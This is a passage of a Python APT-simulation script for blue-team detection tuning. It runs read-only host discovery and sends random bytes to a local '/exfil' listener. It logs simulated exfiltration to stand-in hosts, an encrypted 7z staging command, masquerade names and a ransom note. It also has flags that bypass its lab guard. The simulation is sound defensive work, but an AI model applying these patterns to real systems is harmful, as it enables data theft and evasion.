"""08 Discovery / Lateral / Exfil Lab — APT tradecraft simulator (lab-only, report-only).

MITRE ATT&CK Coverage (intended for blue-team detection tuning):
  TA0005 Defense Evasion  -> T1027 Obfuscated Files, T1070 Indicator Removal, T1036 Masquerading
  TA0007 Discovery        -> T1082 System Information Discovery, T1083 File/Directory Discovery,
                           T1018 Remote System Discovery, T1069 Permission Groups Discovery
  TA0008 Lateral Movement -> T1021 Remote Services (SMB/PsExec/WMI), T1550 Use Alternate Auth Material,
                           T1080 Taint Shared Content (simulated)
  TA0009 Collection       -> T1005 Data from Local System, T1074 Data Staged
  TA0010 Exfiltration     -> T1041 Exfil Over C2 Channel, T1048 Exfil Over Alt Protocol (DNS, cloud dead-drop)
  TA0040 Impact           -> T1486 Data Encrypted for Impact, T1496 Resource Hijacking (report-only)

Enhances C2: extends 04-c2-detection-lab (listener at 127.0.0.1:8080 /exfil) with jittered,
UA-rotated exfil and DNS/cloud simulations; emits finding-like JSON ingestible by
05-pentest-report-copilot parsers (see emit_findings()).

Safety — READ BEFORE RUN:
  * LAB ONLY: every network target is validated via rtai_core.validation.assert_lab_address.
    Only loopback (127.0.0.1/::1), RFC1918 private, CGNAT, and link-local are allowed.
    Public or documentation nets (RFC5737) are explicitly refused.
  * AUTHORIZED USE GATE: interactive prompt requires typing exactly ATTACK, or env bypass
    APT_LAB_ATTESTED validated with HMAC when RTAI_ATTEST_KEY is set (see _env_bypass_ok).
    All authorizations are recorded to the tamper-evident AuditChain (audit.log hash chain).
  * READ-ONLY DISCOVERY: env vars are counted/named only (values truncated/redacted),
    process listing via `ps`/`tasklist` is read-only, file enumeration is limited to the
    lab temp staging dir. Real user documents are NEVER read, collected, or exfiltrated.
  * LATERAL/EXFIL/IMPACT are SIMULATED: lateral logs a PsExec/WMI/SMB attempt to 127.0.0.1
    but never connects or authenticates; exfil POSTs random bytes to the local listener
    (payload is synthetic, never real data); DNS covert channel only logs a TXT query;
    7z and encryption are logged placeholders, never executed.
  * AUDIT CHAIN: every phase appends to audit.log (hash-chained, tamper-evident) and to
    a JSONL telemetry store for detection engineering (Sigma/Suricata tuning).
  * INTEGRATION: telemetry JSONL uses same schema as 04 listener (event field) so
    04/analyze.py can ingest it; findings JSON matches 05 copilot's normalized shape.

Usage:
  python apt_lab.py --help
  python apt_lab.py --host 127.0.0.1 --port 8080 --log apt_telemetry.jsonl --findings findings.json
  APT_LAB_ATTESTED=$(python -c "import hmac,hashlib,os;print(hmac.new(os.environ['RTAI_ATTEST_KEY'].encode(),b'attested',hashlib.sha256).hexdigest()[:16])") python apt_lab.py --yes --host 127.0.0.1 --log apt.jsonl

Exit codes: 0 ok, 64 validation, 77 auth, 74 storage, 75 target/lab-guard, 70 internal.
"""

import argparse
import base64
import datetime as dt
import hashlib
import hmac
import json
import os
import platform
import random
import subprocess
import sys
import tempfile
import time
import urllib.request
import urllib.error
import uuid
from pathlib import Path
from typing import Dict, List, Optional

from rtai_core.audit import AuditChain, actor_from_env, record as audit_record
from rtai_core.exceptions import AuthError, RTAIError, StorageError, ValidationError
from rtai_core.logging_utils import get_logger
from rtai_core.storage import JsonlStore, SqliteEventStore
from rtai_core.validation import assert_lab_address

LOG = get_logger("aptlab")
ATTEST_PHRASE = "ATTACK"
ENV_BYPASS = "APT_LAB_ATTESTED"
ENV_BYPASS_ALT = "RTAI_APT_ATTESTED"  # alias
GENESIS = "0" * 64

# ---------------------------------------------------------------------------
# UA rotation — same philosophy as 04-c2-detection-lab/beacon.py:24-36
# Simulates T1027 obfuscation at the network layer.
# ---------------------------------------------------------------------------
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/126 Safari/537.36",
    "python-requests/2.31.0",
    "curl/8.5.0",
    "Wget/1.21.4",
]

# Lateral movement simulation methods (all log-only, never executed)
LATERAL_METHODS = [
    {"technique": "T1021.001", "method": "PsExec", "port": 445, "desc": "Remote Services: SMB/PsExec"},
    {"technique": "T1021.006", "method": "WMI", "port": 135, "desc": "Remote Services: Windows RM/WMI"},
    {"technique": "T1021.004", "method": "SMB", "port": 445, "desc": "Remote Services: SMB Share"},
    {"technique": "T1550.002", "method": "Pass-the-Hash", "port": 445, "desc": "Use Alternate Auth: PtH"},
    {"technique": "T1080", "method": "TaintSharedContent", "port": 445, "desc": "Taint Shared Content (deprecated, simulated)"},
]

# ATT&CK tactic mapping for README / findings
TACTIC_MAP = {
    "TA0005": {"name": "Defense Evasion", "techniques": ["T1027", "T1070", "T1036"]},
    "TA0007": {"name": "Discovery", "techniques": ["T1082", "T1083", "T1018", "T1069"]},
    "TA0008": {"name": "Lateral Movement", "techniques": ["T1021", "T1550", "T1080"]},
    "TA0009": {"name": "Collection", "techniques": ["T1005", "T1074"]},
    "TA0010": {"name": "Exfiltration", "techniques": ["T1041", "T1048"]},
    "TA0040": {"name": "Impact", "techniques": ["T1486", "T1496"]},
}

# ---------------------------------------------------------------------------
# Authorization gate (ATTACK phrase + HMAC) — mirrors 02/inject_fuzzer.py:28-60
# ---------------------------------------------------------------------------

def _env_bypass_ok() -> bool:
    val = os.environ.get(ENV_BYPASS) or os.environ.get(ENV_BYPASS_ALT) or ""
    if not val:
        return False
    key = os.environ.get("RTAI_ATTEST_KEY")
    if key:
        expected = hmac.new(key.encode(), b"attested", hashlib.sha256).hexdigest()[:16]
        return hmac.compare_digest(val, expected)
    # legacy fallback — emit warning but allow for local lab convenience
    if hmac.compare_digest(val, "1"):
        print(f"[*] {ENV_BYPASS}=1 legacy bypass — set RTAI_ATTEST_KEY for HMAC in production")
        return True
    return False


def require_authorization(skip_flag: bool = False) -> None:
    """Enforce authorized-use gate. Raises AuthError on failure."""
    if skip_flag and _env_bypass_ok():
        try:
            audit_record("authorization", actor=actor_from_env(), tool="apt-lab", bypass="hmac", phrase=ATTEST_PHRASE)
        except Exception:
            pass
        return
    if skip_flag and (os.environ.get(ENV_BYPASS) or os.environ.get(ENV_BYPASS_ALT)):
        try:
            audit_record("authorization_failed", actor=actor_from_env(), tool="apt-lab", reason="hmac_mismatch")
        except Exception:
            pass
        raise AuthError(f"--yes requires valid {ENV_BYPASS} (HMAC of RTAI_ATTEST_KEY) — authorization refused")
    # Interactive attestation — must type ATTACK exactly
    try:
        answer = input(f"Type {ATTEST_PHRASE} to certify lab-only use on 127.0.0.1 (authorized simulation): ").strip()
    except EOFError:
        answer = ""
    if not hmac.compare_digest(answer, ATTEST_PHRASE):
        try:
            audit_record("authorization_failed", actor=actor_from_env(), tool="apt-lab", reason="phrase_mismatch")
        except Exception:
            pass
        raise AuthError("authorization not confirmed — aborting (need ATTACK)")
    try:
        audit_record("authorization", actor=actor_from_env(), tool="apt-lab", bypass="interactive", phrase=ATTEST_PHRASE)
    except Exception:
        pass


def validate_lab_target(host: str, allow_public: bool = False) -> None:
    if allow_public:
        try:
            audit_record("lab_guard_bypass", actor=actor_from_env(), host=host, tool="apt-lab")
        except Exception:
            pass
        print(f"[!] WARNING --allow-public set, targeting {host} without lab guard (audited)")
        return
    try:
        assert_lab_address(host)
    except ValueError as exc:
        try:
            audit_record("lab_guard_refused", actor=actor_from_env(), host=host, reason=str(exc)[:120], tool="apt-lab")
        except Exception:
            pass
        raise


# ---------------------------------------------------------------------------
# Discovery — TA0007
# Techniques: T1082, T1083, T1018, T1069 via read-only local enumeration.
# Safety: never exfiltrate real user data; env values redacted, file list
# limited to temp dir, process listing via read-only ps.
# ---------------------------------------------------------------------------

def discover_t1082_system_info() -> Dict:
    """T1082 System Information Discovery — read-only local platform inspection."""
    uname = platform.uname()
    info = {
        "technique": "T1082",
        "tactic": "TA0007",
        "system": platform.system(),
        "release": platform.release(),
        "version": platform.version()[:120],
        "machine": platform.machine(),
        "processor": platform.processor()[:80] if platform.processor() else "unknown",
        "hostname": uname.node[:64],
        "python": platform.python_version(),
        "cwd": str(Path.cwd())[:120],
    }
    return info


def discover_t1083_file_directory(temp_dir: Path) -> Dict:
    """T1083 File and Directory Discovery — enumerate lab temp staging dir only."""
    temp_dir.mkdir(parents=True, exist_ok=True)
    entries: List[str] = []
    try:
        for child in temp_dir.iterdir():
            entries.append(child.name[:80])
            if len(entries) >= 50:
                break
    except OSError as exc:
        entries = [f"error:{exc}"[:80]]
    return {
        "technique": "T1083",
        "tactic": "TA0007",
        "path": str(temp_dir)[:120],
        "count": len(entries),
        "sample": entries[:10],
        "note": "lab temp dir only — no user profile enumeration",
    }


def discover_t1018_remote_system(lab_host: str = "127.0.0.1") -> Dict:
    """T1018 Remote System Discovery — simulated via lab host resolution only."""
    resolved = []
    try:
        import socket
        infos = socket.getaddrinfo(lab_host, None)
        for info in infos:
            resolved.append(str(info[4][0])[:64])
    except Exception as exc:
        resolved = [f"resolve_error:{exc}"[:80]]
    return {
        "technique": "T1018",
        "tactic": "TA0007",
        "lab_host": lab_host,
        "resolved": sorted(set(resolved))[:5],
        "note": "lab-only resolution — no network sweep",
    }


def discover_t1069_permission_groups() -> Dict:
    """T1069 Permission Groups Discovery — local user/group enumeration (read-only)."""
    user = "unknown"
    groups: List[str] = []
    try:
        import getpass
        user = getpass.getuser()[:64]
    except Exception:
        pass
    # Try platform-specific group listing — read-only, non-privileged
    try:
        if os.name == "nt":
            # On Windows, whoami /groups is read-only; we simulate parsing length only
            proc = subprocess.run(["whoami", "/groups"], capture_output=True, text=True, timeout=3)
            if proc.returncode == 0:
                lines = [l.strip()[:80] for l in proc.stdout.splitlines() if l.strip()]
                groups = lines[:10]
            else:
                groups = ["whoami_failed"]
        else:
            proc = subprocess.run(["id"], capture_output=True, text=True, timeout=3)
            if proc.returncode == 0:
                groups = [proc.stdout.strip()[:120]]
            else:
                # fallback: try groups command
                proc2 = subprocess.run(["groups"], capture_output=True, text=True, timeout=3)
                groups = [proc2.stdout.strip()[:120]] if proc2.returncode == 0 else ["id_failed"]
    except Exception as exc:
        groups = [f"enum_error:{exc}"[:80]]
    return {
        "technique": "T1069",
        "tactic": "TA0007",
        "user": user,
        "groups_sample": groups[:5],
        "redacted": True,
        "note": "local groups only — no domain enumeration",
    }


def discover_processes_ps() -> Dict:
    """Helper for discovery — list processes via ps/tasklist (read-only)."""
    procs: List[str] = []
    cmd = None
    try:
        if os.name == "nt":
            cmd = ["tasklist", "/FO", "CSV", "/NH"]
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
            if proc.returncode == 0:
                lines = proc.stdout.splitlines()[:20]
                for line in lines:
                    # CSV first field is image name
                    name = line.split(",")[0].strip('"')[:64] if line else ""
                    if name:
                        procs.append(name)
            else:
                procs = ["tasklist_unavailable"]
        else:
            # POSIX: ps -o pid,comm
            for trial in [["ps", "-o", "pid,comm", "-x"], ["ps", "-o", "comm"]]:
                try:
                    proc = subprocess.run(trial, capture_output=True, text=True, timeout=5)
                    if proc.returncode == 0:
                        lines = proc.stdout.splitlines()[1:21]  # skip header
                        for line in lines:
                            procs.append(line.strip()[:64])
                        break
                except FileNotFoundError:
                    continue
            if not procs:
                procs = ["ps_unavailable"]
    except Exception as exc:
        procs = [f"ps_error:{exc}"[:80]]
    # Never log full command lines (may contain secrets) — names only, truncated
    return {
        "technique": "T1057",  # Process Discovery (bonus)
        "tactic": "TA0007",
        "count": len(procs),
        "sample": procs[:10],
        "cmd": " ".join(cmd) if cmd else "ps",
        "redacted": "cmdline_redacted",
    }


def discover_env_vars() -> Dict:
    """T1082-adjacent — env var enumeration (names only, values redacted)."""
    keys = sorted(os.environ.keys())
    # Values are sensitive — we log only count, names, and truncated key hashes
    sample_keys = keys[:10]
    # Provide key count + first 15 names, never values
    return {
        "technique": "T1082",
        "tactic": "TA0007",
        "sub": "env_vars",
        "count": len(keys),
        "sample_keys": sample_keys,
        "note": "env values REDACTED — names only for discovery simulation",
    }


def run_discovery(temp_dir: Path, lab_host: str) -> List[Dict]:
    results: List[Dict] = []
    results.append(discover_t1082_system_info())
    results.append(discover_env_vars())
    results.append(discover_processes_ps())
    results.append(discover_t1083_file_directory(temp_dir))
    results.append(discover_t1018_remote_system(lab_host))
    results.append(discover_t1069_permission_groups())
    return results


# ---------------------------------------------------------------------------
# Lateral Movement — TA0008
# Simulated via logging PsExec/WMI/SMB attempts to lab host 127.0.0.1 with
# jitter and audit. NEVER actually attempts authentication or network lateral.
# ---------------------------------------------------------------------------

def simulate_lateral_movement(host: str, port: int, store: JsonlStore, audit_chain: AuditChain, jitter: float = 0.35) -> List[Dict]:
    events: List[Dict] = []
    for method in LATERAL_METHODS:
        # jittered delay between simulated attempts — dwell-time tradecraft
        delay = random.uniform(0.1, 0.6) * (1 + random.uniform(-jitter, jitter))
        time.sleep(max(0.05, delay))
        event = {
            "event": "lateral_attempt",
            "technique": method["technique"],
            "tactic": "TA0008",
            "method": method["method"],
            "dst_host": host,
            "dst_port": method["port"],
            "desc": method["desc"],
            "result": "simulated_blocked_lab_only",
            "jitter_delay_ms": int(delay * 1000),
            "note": "LOG ONLY — no network connection attempted",
        }
        try:
            store.append(event)
        except Exception as exc:
            LOG.warning("store lateral failed: %s", exc)
        try:
            audit_chain.record("lateral_sim", actor=actor_from_env(), method=method["method"], host=host, technique=method["technique"], port=method["port"])
        except Exception:
            pass
        events.append(event)
        LOG.info("lateral sim %s -> %s:%s blocked", method["method"], host, method["port"])
    return events


# ---------------------------------------------------------------------------
# Collection — TA0009
# T1005 Data from Local System, T1074 Data Staged — staging to temp dir with
# dummy files + 7z placeholder (log only, no real archiving of user data).
# ---------------------------------------------------------------------------

def simulate_collection(staging_dir: Path, store: JsonlStore, audit_chain: AuditChain, num_dummy: int = 3) -> Dict:
    staging_dir.mkdir(parents=True, exist_ok=True)
    dummy_files: List[str] = []
    total_bytes = 0
    for i in range(max(1, num_dummy)):
        fname = staging_dir / f"stage_dummy_{i:02d}.bin"
        # random bytes — synthetic, not user data
        content = os.urandom(random.randint(128, 512))
        try:
            fname.write_bytes(content)
            dummy_files.append(str(fname.name))
            total_bytes += len(content)
        except OSError as exc:
            LOG.warning("staging write failed: %s", exc)
    # 7z placeholder — log only, never execute compression on real data
    archive_placeholder = str(staging_dir / "staged.7z")
    seven_z_cmd = f"7z a -pInfected -mhe=on {archive_placeholder} {' '.join(dummy_files)}"
    event = {
        "event": "collection_staged",
        "techniques": ["T1005", "T1074"],
        "tactic": "TA0009",
        "staging_dir": str(staging_dir)[:120],
        "dummy_files": dummy_files,
        "total_bytes": total_bytes,
        "archive_placeholder": archive_placeholder[:120],
        "seven_z_sim": seven_z_cmd[:200],
        "note": "LOG ONLY — dummy random bytes, no real user files collected; 7z not executed",
    }
    try:
        store.append(event)
    except Exception as exc:
        LOG.warning("store collection failed: %s", exc)
    try:
        audit_chain.record("collection_sim", actor=actor_from_env(), staging=str(staging_dir), files=len(dummy_files), bytes=total_bytes)
    except Exception:
        pass
    LOG.info("collection staged %s files %s bytes (sim)", len(dummy_files), total_bytes)
    return event


# ---------------------------------------------------------------------------
# Defense Evasion — TA0005
# T1027 Obfuscated Files (+ UA rotation), T1070 Indicator Removal (timestomp),
# T1036 Masquerading — all simulation/log-only.
# ---------------------------------------------------------------------------

MASQUERADE_NAMES = [
    "svchost.exe",
    "rundll32.exe",
    "dllhost.exe",
    "msedge.exe",
    "chrome.exe",
    "explorer.exe",
]

OBFUSCATED_SAMPLE = base64.b64encode(b"simulated_payload_for_detection_testing_only").decode()

def simulate_defense_evasion(staging_dir: Path, store: JsonlStore, audit_chain: AuditChain) -> List[Dict]:
    events: List[Dict] = []
    # T1027 — obfuscated files / base64 payload (simulated)
    ua = random.choice(USER_AGENTS)
    obf_event = {
        "event": "defense_evasion",
        "technique": "T1027",
        "tactic": "TA0005",
        "sub": "obfuscated_files",
        "ua_rotated": ua[:80],
        "payload_b64_sample": OBFUSCATED_SAMPLE[:40] + "...",
        "note": "UA rotation + base64 obfuscation simulated (log only)",
    }
    try:
        store.append(obf_event)
    except Exception:
        pass
    events.append(obf_event)

    # T1070 — timestomp simulation (log mtime manipulation, never modify real artifacts)
    fake_original = (dt.datetime.now() - dt.timedelta(days=random.randint(30, 90))).isoformat()
    fake_new = dt.datetime.now().isoformat()
    # Touch a dummy staged file's timestamps in-memory concept — log only
    timestomp_event = {
        "event": "defense_evasion",
        "technique": "T1070.006",
        "tactic": "TA0005",
        "sub": "timestomp",
        "file": str((staging_dir / "stage_dummy_00.bin").name)[:80],
        "original_mtime_sim": fake_original,
        "timestomped_mtime_sim": fake_new,
        "note": "LOG ONLY — no filesystem timestamps modified (report-only)",
    }
    try:
        store.append(timestomp_event)
    except Exception:
        pass
    events.append(timestomp_event)

    # T1036 — masquerading (log process name masquerade, no execution)
    masq = random.choice(MASQUERADE_NAMES)
    masq_event = {
        "event": "defense_evasion",
        "technique": "T1036",
        "tactic": "TA0005",
        "sub": "masquerading",
        "masqueraded_as": masq,
        "real_binary": "apt_lab.py",
        "note": f"LOG ONLY — would masquerade as {masq} (report-only, no process creation)",
    }
    try:
        store.append(masq_event)
    except Exception:
        pass
    events.append(masq_event)

    for ev in events:
        try:
            audit_chain.record("defense_evasion_sim", actor=actor_from_env(), technique=ev["technique"], sub=ev.get("sub", ""))
        except Exception:
            pass
    LOG.info("defense evasion simulated: T1027+T1070+T1036")
    return events


# ---------------------------------------------------------------------------
# Exfiltration — TA0010
# T1041 Exfil Over C2 Channel (POST to 127.0.0.1 listener with random bytes),
# T1048 Exfil Over Alt Protocol — DNS TXT covert channel simulation (log only)
# and cloud dead-drop simulation (log only). Enhances 04 C2.
# ---------------------------------------------------------------------------

def _post_random_exfil(host: str, port: int, store: JsonlStore, audit_chain: AuditChain, attempts: int = 2) -> List[Dict]:
    """T1041 via POST to lab listener 127.0.0.1:8080/exfil — random bytes, UA rotation."""
    events: List[Dict] = []
    for i in range(max(1, attempts)):
        chunk = os.urandom(random.randint(256, 1024))
        sha16 = hashlib.sha256(chunk).hexdigest()[:16]
        ua = random.choice(USER_AGENTS)
        cookie = f"sid={uuid.uuid4().hex[:24]}"
        url = f"http://{host}:{port}/exfil"
        headers = {
            "User-Agent": ua,
            "Cookie": cookie,
            "Content-Type": "application/octet-stream",
            "X-APT-Lab": "simulated-exfil",
        }
        result = "not_attempted"
        status = None
        try:
            req = urllib.request.Request(url, data=chunk, method="POST")
            for k, v in headers.items():
                req.add_header(k, v)
            with urllib.request.urlopen(req, timeout=5) as resp:
                body = resp.read()
                status = resp.status
                result = f"delivered_status_{resp.status}"
        except urllib.error.URLError as exc:
            result = f"listener_unreachable:{exc.reason}"[:120] if hasattr(exc, "reason") else f"url_error:{exc}"[:120]
            LOG.warning("exfil POST failed (expected if listener not running): %s", result)
        except Exception as exc:
            result = f"error:{exc}"[:120]
            LOG.warning("exfil POST error: %s", exc)
        event = {
            "event": "exfil_c2",
            "technique": "T1041",
            "tactic": "TA0010",
            "url": url,
            "bytes": len(chunk),
            "sha16": sha16,
            "ua": ua[:80],
            "cookie": cookie[:20] + "...",
            "result": result,
            "status": status,
            "note": "synthetic random bytes — never real user data; integrates with 04 listener",
        }
        try:
            store.append(event)
        except Exception:
            pass
        try:
            audit_chain.record("exfil_sim", actor=actor_from_env(), technique="T1041", host=host, port=port, bytes=len(chunk), sha16=sha16, result=result[:60])
        except Exception:
            pass
        events.append(event)
        LOG.info("exfil T1041 POST %s bytes sha16=%s -> %s", len(chunk), sha16, result)
        # jitter between exfil chunks
        time.sleep(random.uniform(0.2, 0.8))
    return events


def _simulate_dns_covert(staging_dir: Path, store: JsonlStore, audit_chain: AuditChain) -> Dict:
    """T1048 DNS covert channel simulation — log DNS TXT query, not real exfil."""
    # Simulate encoding a staged chunk as hex subdomains (like beacon DNS exfil)
    fake_chunk_hex = os.urandom(16).hex()[:32]  # 16 random bytes -> 32 hex chars
    # chunk into DNS label sized pieces
    labels = [fake_chunk_hex[i:i+16] for i in range(0, len(fake_chunk_hex), 16)]
    dns_query = ".".join(labels) + ".lab.example"
    # Base64 variant for TXT record simulation
    txt_payload = base64.b64encode(os.urandom(24)).decode()[:32]
    event = {
        "event": "exfil_dns",
        "technique": "T1048.003",
        "tactic": "TA0010",
        "sub": "DNS_TXT",
        "dns_query_sim": dns_query[:120],
        "txt_payload_sim": txt_payload[:40] + "...",
        "note": "LOG ONLY — DNS TXT query simulated, never sent; no real DNS exfil",
    }
    try:
        store.append(event)
    except Exception:
        pass
    try:
        audit_chain.record("exfil_dns_sim", actor=actor_from_env(), technique="T1048.003", query=dns_query[:60])
    except Exception:
        pass
    LOG.info("exfil DNS TXT sim query %s", dns_query)
    return event


def _simulate_cloud_dead_drop(store: JsonlStore, audit_chain: AuditChain) -> Dict:
    """T1048 cloud dead-drop simulation — log only."""
    # Simulate dead-drop to cloud storage via anonymous upload (log placeholder)
    fake_bucket = f"https://lab-deaddrop.example/{uuid.uuid4().hex[:12]}/staged.7z"
    event = {
        "event": "exfil_cloud",
        "technique": "T1048",
        "tactic": "TA0010",
        "sub": "cloud_dead_drop",
        "dead_drop_url_sim": fake_bucket[:120],
        "provider_sim": random.choice(["s3", "gdrive", "dropbox", "pastebin"]),
        "note": "LOG ONLY — cloud upload simulated, never executed",
    }
    try:
        store.append(event)
    except Exception:
        pass
    try:
        audit_chain.record("exfil_cloud_sim", actor=actor_from_env(), technique="T1048", provider=event["provider_sim"])
    except Exception:
        pass
    LOG.info("exfil cloud dead-drop sim %s", fake_bucket)
    return event


def simulate_exfiltration(host: str, port: int, staging_dir: Path, store: JsonlStore, audit_chain: AuditChain) -> List[Dict]:
    events: List[Dict] = []
    events.extend(_post_random_exfil(host, port, store, audit_chain, attempts=2))
    events.append(_simulate_dns_covert(staging_dir, store, audit_chain))
    events.append(_simulate_cloud_dead_drop(store, audit_chain))
    return events


# ---------------------------------------------------------------------------
# Impact — TA0040
# T1486 Data Encrypted for Impact, T1496 Resource Hijacking — report-only,
# no real encryption or resource abuse.
# ---------------------------------------------------------------------------

def simulate_impact(store: JsonlStore, audit_chain: AuditChain) -> List[Dict]:
    events: List[Dict] = []
    # T1486 — report what ransomware WOULD do
    ransom_note_sim = "YOUR FILES HAVE BEEN ENCRYPTED (SIMULATED) — lab report only, no files were touched."
    t1486 = {
        "event": "impact",
        "technique": "T1486",
        "tactic": "TA0040",
        "sub": "data_encrypted_for_impact",
        "ransom_note_sim": ransom_note_sim[:120],
        "files_would_encrypt": 0,
        "note": "REPORT-ONLY — no encryption executed; detection rule should fire on ransom note creation",
    }
    try:
        store.append(t1486)
    except Exception:
        pass
    events.append(t1486)

    # T1496 — resource hijacking simulation (e.g., crypto-mining)
    t1496 = {
        "event": "impact",
        "technique": "T1496",
        "tactic": "TA0040",
        "sub": "resource_hijacking",
        "cpu_would_consume": "85%",
        "process_masq": random.choice(MASQUERADE_NAMES),
        "note": "REPORT-ONLY — no CPU hijack executed; log for EDR rule testing",
    }
    try:
        store.append(t1496)
    except Exception:
        pass
    events.append(t1496)

    for ev in events:
        try:
            audit_chain.record("impact_sim", actor=actor_from_env(), technique=ev["technique"], sub=ev.get("sub",""))
        except Exception:
            pass
    LOG.info("impact simulated: T1486 + T1496 (report-only)")
    return events


# ---------------------------------------------------------------------------
# Finding emission for 05-pentest-report-copilot ingestion
# Shape is compatible with copilot parsers (tool/kind/host/location/title/severity)
# ---------------------------------------------------------------------------

def build_findings(events: List[Dict], host: str = "127.0.0.1") -> List[Dict]:
    """Convert simulation telemetry into finding-like JSON for 05 copilot parsers."""
    # Each major phase becomes a finding; severity is calibrated for report demo
    findings: List[Dict] = []
    mapping = [
        ("F-001", "Discovery: System Information (T1082) simulated", "info", ["T1082"], "TA0007"),
        ("F-002", "Discovery: File & Directory Enumeration (T1083) in lab temp", "low", ["T1083"], "TA0007"),
        ("F-003", "Discovery: Permission Groups (T1069) enumerated", "info", ["T1069"], "TA0007"),
        ("F-004", "Lateral Movement: PsExec/WMI/SMB simulation to lab host", "high", ["T1021","T1550"], "TA0008"),
        ("F-005", "Collection: Staging directory with dummy files + 7z placeholder", "medium", ["T1005","T1074"], "TA0009"),
        ("F-006", "Exfiltration: C2 channel POST to lab listener (T1041)", "high", ["T1041"], "TA0010"),
        ("F-007", "Exfiltration: DNS TXT covert channel simulation (T1048.003)", "medium", ["T1048"], "TA0010"),
        ("F-008", "Defense Evasion: UA rotation / obfuscation (T1027)", "low", ["T1027"], "TA0005"),
        ("F-009", "Defense Evasion: Timestomp & masquerading (T1070/T1036)", "medium", ["T1070","T1036"], "TA0005"),
        ("F-010", "Impact: Ransomware & resource hijack report-only (T1486/T1496)", "critical", ["T1486","T1496"], "TA0040"),
    ]
    for ref, title, severity, techniques, tactic in mapping:
        findings.append({
            "ref": ref,
            "tool": "apt-lab",
            "kind": "simulation",
            "host": host,
            "hostname": host,
            "location": f"{host}:apt-lab/{ref}",
            "title": title,
            "severity": severity,
            "techniques": techniques,
            "tactic": tactic,
            "tactic_name": TACTIC_MAP.get(tactic, {}).get("name", tactic),
            "cve": None,
            "tags": techniques + [tactic],
            "description": f"Simulated {', '.join(techniques)} under {tactic} — lab-only, logged to JSONL, never executed against real assets.",
        })
    # Append per-event enriched tags so copilot can chain narrative Entry->Escalation->Impact
    for ev in events[:5]:
        if ev.get("technique"):
            findings.append({
                "ref": f"SUP-{uuid.uuid4().hex[:4]}",
                "tool": "apt-lab",
                "kind": "telemetry",
                "host": host,
                "hostname": host,
                "location": f"{host}:telemetry/{ev.get('technique','')}",
                "title": f"Telemetry: {ev.get('technique')} {ev.get('event','')}",
                "severity": "info",
                "techniques": [ev.get("technique")] if isinstance(ev.get("technique"), str) else ev.get("technique", []),
                "tactic": ev.get("tactic", "unknown"),
            })
    return findings


def emit_findings_json(findings_path: str, events: List[Dict], host: str) -> Dict:
    findings = build_findings(events, host=host)
    # Stats block like 05 copilot expects
    by_sev: Dict[str, int] = {}
    for f in findings:
        sev = f.get("severity", "info")
        by_sev[sev] = by_sev.get(sev, 0) + 1
    bundle = {
        "company": "Lab",
        "assessment_type": "APT Lab Simulation — 08",
        "generated": dt.datetime.now().isoformat(timespec="seconds"),
        "host": host,
        "stats": {"total": len(findings), "by_severity": by_sev, "hosts": 1, "tactics": list(TACTIC_MAP.keys())},
        "findings": findings,
        "telemetry_events": events[-20:],  # tail for copilot narrative
        "note": "Synthetic findings — ingest with 05-pentest-report-copilot for AI-narrated report (e.g., python copilot.py --nmap /dev/null replacement via findings JSON)",
    }
    try:
        Path(findings_path).parent.mkdir(parents=True, exist_ok=True)
        with open(findings_path, "w", encoding="utf-8") as fh:
            json.dump(bundle, fh, indent=2, default=str)
    except OSError as exc:
        raise StorageError(f"cannot write findings {findings_path}: {exc}") from exc
    return bundle


# ---------------------------------------------------------------------------
# Orchestration — main()
# ---------------------------------------------------------------------------

def main() -> int:
    parser = argparse.ArgumentParser(
        description="08 APT Lab — Discovery through Impact simulator (lab-only, audit-chained)",
        epilog="Lab guard: only 127.0.0.1 / loopback / RFC1918. Authorization: type ATTACK or HMAC via APT_LAB_ATTESTED.",
    )
    parser.add_argument("--host", default="127.0.0.1", help="lab listener host (default 127.0.0.1, lab-only)")
    parser.add_argument("--port", type=int, default=8080, help="lab listener port (default 8080, matches 04 listener)")
    parser.add_argument("--log", default="apt_telemetry.jsonl", help="JSONL telemetry log (append-only, for 04 analyze.py)")
    parser.add_argument("--findings", default="apt_findings.json", help="finding-like JSON bundle for 05 copilot ingestion")
    parser.add_argument("--staging-dir", dest="staging_dir", default=None, help="staging dir (default: temp/apt_lab_stage_*)")
    parser.add_argument("--db", default=None, help="also mirror telemetry into SQLite (e.g. apt_events.db)")
    parser.add_argument("--exfil-count", type=int, default=2, help="number of synthetic exfil POSTs (default 2)")
    parser.add_argument("--dummy-files", type=int, default=3, help="number of dummy staged files (default 3)")
    parser.add_argument("--jitter", type=float, default=0.35, help="jitter fraction for lateral/exfil timing (0.0-1.0)")
    parser.add_argument("--allow-public", action="store_true", help="allow non-lab host (requires explicit flag + audit — lab-network exception only)")
    parser.add_argument("--yes", action="store_true", help="skip interactive ATTACK prompt (requires APT_LAB_ATTESTED HMAC when RTAI_ATTEST_KEY set)")
    parser.add_argument("--dry-run", action="store_true", help="dry-run — log what would be done, no telemetry written")
    parser.add_argument("--verbose", action="store_true", help="verbose logging")
    args = parser.parse_args()
    if args.dry_run:
        print("[dry-run] APT lab dry-run — no telemetry written, no audit")
        print(f"  would run: discovery (T1082/T1083/T1018/T1069) host={args.host}")
        print(f"  would run: defense evasion (T1027/T1070/T1036)")
        print(f"  would run: collection (T1005/T1074) staging={args.staging_dir or 'temp'}")
        print(f"  would run: lateral (T1021/T1550) to {args.host}:{args.port}")
        print(f"  would run: exfil (T1041/T1048) {args.exfil_count} POSTs to {args.host}:{args.port}/exfil")
        print(f"  would run: impact (T1486/T1496) report-only")
        return 0

    # logging
    try:
        from rtai_core.logging_utils import setup_logging
        setup_logging(verbose=args.verbose)
    except Exception:
        pass

    # ------------------------------------------------------------------
    # Lab guard — early, before any simulation (defense-in-depth: also checked in helpers)
    # ------------------------------------------------------------------
    try:
        validate_lab_target(args.host, allow_public=args.allow_public)
    except (ValueError, RTAIError) as exc:
        print(f"[x] lab guard refused: {exc}", file=sys.stderr)
        return 75
    if not 0.0 <= args.jitter <= 1.0:
        print("[x] --jitter must be 0.0-1.0", file=sys.stderr)
        return 64
    if args.port < 1 or args.port > 65535:
        print("[x] --port must be 1-65535", file=sys.stderr)
        return 64

    # ------------------------------------------------------------------
